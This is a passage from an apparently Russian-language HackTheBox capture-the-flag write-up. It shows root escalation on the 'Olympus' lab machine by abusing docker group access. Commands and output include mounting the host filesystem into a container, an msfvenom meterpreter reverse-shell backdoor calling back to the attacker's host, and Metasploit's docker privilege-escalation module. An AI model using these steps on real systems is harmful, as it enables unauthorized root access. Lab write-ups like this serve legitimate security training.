ce2ecb56a96e        rodhes              "/etc/bind/entrypoin…"   5 months ago        Up 16 minutes       0.0.0.0:53->53/tcp, 0.0.0.0:53->53/udp   rhodes
620b296204a3        olympia             "/usr/sbin/sshd -D"      5 months ago        Up 16 minutes       0.0.0.0:2222->22/tcp                     olympia
```

Вклинимся в файловую систему скажем контейнера `olympia`, примонтировав root-директорию хоста, призовем шелл и прочитаем root-флаг:
```text
prometheus@olympus:~$ docker run --rm -i -t -v /:/hostOS olympia /bin/bash
root@89763840b853:/# whoami
root

root@89763840b853:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### root.txt
```text
root@89763840b853:/# cat /hostOS/root/root.txt
aba48699????????????????????????
```

Для тех, кто не понял, что произошло, рекомендую крутую статью из 2-х частей про базовые принципы безопасности docker'а: [раз](https://blog.mi.hdm-stuttgart.de/index.php/2016/08/06/exploring-docker-security-part-1-the-whales-anatomy "Exploring Docker Security – Part 1: The whale's anatomy / Computer Science Blog"), [два](https://blog.mi.hdm-stuttgart.de/index.php/2016/08/16/exploring-docker-security-part-2-container-flaws "Exploring Docker Security – Part 2: Container flaws / Computer Science Blog").

## PrivEsc: prometheus → root. Способ 2
Но это и правда было действительно слишком просто, а значит мы неудовлетворены :unamused:

Испробуем на этой машине Metasploit-модуль для повышения привилегий в системах с доступом к docker'y. Для этого нам потребуется:
  * бэкдор;
  * msf: `exploit/multi/handler`;
  * msf: `linux/local/docker_daemon_privilege_escalation`.

Для удобства я поднял ssh-master-соединение, а всякие бэкдоры перекидывал через ssh-slave, чтобы не простукивать порты каждый раз. Как настроить такое поведение SSH'а ("SSH Multiplexing") рассказывается, например, [здесь](https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing#Setting_Up_Multiplexing "OpenSSH/Cookbook/Multiplexing - Wikibooks, open books for an open world").

Крафтим бэкдор веномом:
```text
root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f elf --platform linux -a x86 -o .sh3ll.elf
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: .sh3ll.elf
```

Закидываем на прометея:
```text
root@kali:~# scp .shell.elf prometheus@10.10.10.83:.tmp/.sh3ll.elf
```

Поднимаем msf-хэндлер:
```text
msf > use exploit/multi/handler
msf exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.14      yes       The listen address (an interface may be specified)
   LPORT  4444              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.14:4444
```

Активируем бэкдор на прометее и ловим сессию:
```text
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.83:48154) at 2018-08-26 11:02:13 -0400
```

Дальше как по нотам: уходим в фон, выбираем нужную нагрузку (`docker_daemon_privilege_escalation`) для апгрейда сессии и получаем права суперпользователя:
```text
meterpreter > CTRL-Z
Background session 1? [y/N] y
msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                             Connection
  --  ----  ----                   -----------                                             ----------
  1         meterpreter x86/linux  uid=1000, gid=1000, euid=1000, egid=1000 @ 10.10.10.83  10.10.14.14:4444 -> 10.10.10.83:48154 (10.10.10.83)

msf exploit(multi/handler) > use exploit/linux/local/docker_daemon_privilege_escalation
msf exploit(linux/local/docker_daemon_privilege_escalation) > show options

Module options (exploit/linux/local/docker_daemon_privilege_escalation):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.14      yes       The listen address (an interface may be specified)
   LPORT  4444              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf exploit(linux/local/docker_daemon_privilege_escalation) > run

[*] Started reverse TCP handler on 10.10.14.14:4444
[*] Writing payload executable to '/tmp/mfmDpJe'
[*] Executing script to create and run docker container
[*] Sending stage (861480 bytes) to 10.10.10.83
[*] Waiting 60s for payload
[*] Meterpreter session 3 opened (10.10.14.14:4444 -> 10.10.10.83:48162) at 2018-08-26 11:08:30 -0400

meterpreter > getuid
Server username: uid=1000, gid=1000, euid=0, egid=1000

meterpreter > cat /root/root.txt
aba48699????????????????????????
```

Olympus пройден :triumph:

![owned-user.png](/assets/images/htb/machines/olympus/owned-user.png)
{: .center-image}

![owned-root.png](/assets/images/htb/machines/olympus/owned-root.png)
{: .center-image}

![trophy.png](/assets/images/htb/machines/olympus/trophy.png)
{: .center-image}
